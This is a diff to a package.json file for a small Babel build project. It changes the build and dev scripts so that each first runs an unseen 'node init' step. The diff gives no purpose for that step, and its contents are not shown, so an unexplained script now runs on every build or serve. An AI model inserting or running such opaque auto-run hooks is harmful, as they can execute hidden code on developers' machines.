@@ -1,7 +1,7 @@
 {
   "scripts": {
-    "build": "babel --config-file ./babel.config.json BabelClasses.js -o BabelClasses-compiled.js --source-maps",
-    "dev": "http-server ."
+    "build": "node init && babel --config-file ./babel.config.json BabelClasses.js -o BabelClasses-compiled.js --source-maps",
+    "dev": "node init && http-server ."
   },
   "dependencies": {
     "http-server": "^14.1.1"
